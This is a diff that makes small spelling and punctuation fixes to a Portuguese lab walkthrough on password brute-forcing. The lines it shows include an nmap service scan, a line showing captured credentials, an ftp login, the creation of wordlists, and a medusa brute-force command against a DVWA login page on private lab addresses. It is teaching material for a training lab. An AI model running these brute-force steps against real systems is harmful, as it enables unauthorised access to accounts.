@@ -27,7 +27,7 @@ ping -c 3 192.168.56.101
 
 ## Verificação de portas abertas
 
-Com as máqinas conectadas na mesma rede, iremos fazer a verificação de portas abertas da máquina alvo, com o comando.
+Com as máquinas conectadas na mesma rede, iremos fazer a verificação de portas abertas da máquina alvo com o comando.
 
 ```bash
 nmap -sV -p 21,22,80,445,139 192.168.56.102
@@ -65,7 +65,7 @@ ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUC
 
 ## Realizando o ataque
 
-Com os dados da senha e usuário capturados é a hora de realizar o ataque na máquina alvo através do serviço ftp, com o comando.
+Com os dados da senha e usuário capturados é a hora de realizar o ataque na máquina alvo através do serviço ftp com o comando.
 
 ```bash
 ftp 192.168.56.101
@@ -84,7 +84,7 @@ echo -e "user\nadmin\nmsfadmin\nroot" > users.txt
 echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
 echo -e "user\nadmin\nmsfadmin\nroot" > users.txt
 ```
-Utilizando a Medusa para gerar tentativas de senhas e usuários para login, com o comando.
+Utilizando a Medusa para gerar tentativas de senhas e usuários para login com o comando.
 ```bash
 medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
   -m PAGE:/dvwa/login.php \
